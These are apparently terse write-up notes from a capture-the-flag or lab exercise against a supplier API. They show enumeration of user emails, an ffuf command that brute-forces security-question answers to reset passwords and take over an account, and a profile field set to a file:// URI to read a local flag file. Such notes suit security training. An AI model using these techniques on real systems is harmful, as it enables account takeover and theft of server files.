Roles
```
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll"
  ]
}
```

/api/v2/suppliers
These emails have a security question.
```
{
      "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Patrick Howard",
      "email": "P.Howard1536@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Luca Walker",
      "email": "L.Walker1872@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "fafebea0-8894-4744-b7de-6c66d5749740",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Tucker Harris",
      "email": "T.Harris1814@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "36f17195-395f-443e-93a4-8ceee81c6106",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Brandon Rogers",
      "email": "B.Rogers1535@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Mason Alexander",
      "email": "M.Alexander1650@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    }
```
- Saved emails to a file
- Grabbed a colors wordlist from github
```
ffuf -w colors-list.txt:COLORS -w global.txt:EMAILS -u http://94.237.61.249:48711/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -d '{"SupplierEmail": "EMAILS", "SecurityQuestionAnswer": "COLORS", "NewPassword": "P@ssword1"}' -fs 23
```
- HIT on B.Rogers1535@globalsolutions.com, changed password

**B.Rogers
Roles
```
{
  "errorMessage": "User does not have any roles assigned"
}
```

/api/v2/suppliers/current-user/cv POST
- Upload a pdf
```
dd if=/dev/urandom of=reverse-shell.pdf bs=1M count=1
```

/api/v2/suppliers/current-user
```
{
  "SecurityQuestion": "What is your favorite color?",
  "SecurityQuestionAnswer": "rust",
  "ProfessionalCVPDFFileURI": "file:///flag.txt",
  "PhoneNumber": "string",
  "Password": "P@ssword1"
}
```

/api/v2/suppliers/current-user/cv GET
- Convert from Base64
